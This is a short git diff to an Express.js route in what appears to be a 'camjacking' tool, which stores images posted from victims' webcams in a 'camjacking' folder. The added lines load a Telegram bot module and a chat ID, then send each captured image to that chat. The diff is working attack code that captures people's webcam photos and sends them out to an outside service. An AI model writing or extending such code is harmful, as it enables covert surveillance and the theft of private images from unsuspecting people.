@@ -9,6 +9,10 @@ const express = require("express");
 const routes = express.Router();
 const fs = require("fs");
 const os = require("os");
+const tele = require('./bot');
+const chat = require('./config');
+
+const chatid = chat.getChatId();
 
 // get the home directory path
 const homeDir = os.homedir();
@@ -43,6 +47,7 @@ routes.post('/post', (req, res) => {
         res.status(500).send('Error saving image');
       } else {
         console.log("Image saved into "+homeDir+"/camjacking/"+fileName);
+        tele.sendTele(homeDir+"/camjacking/"+fileName,chatid)
         res.send({ message: 'Image saved successfully' });
       }
     });
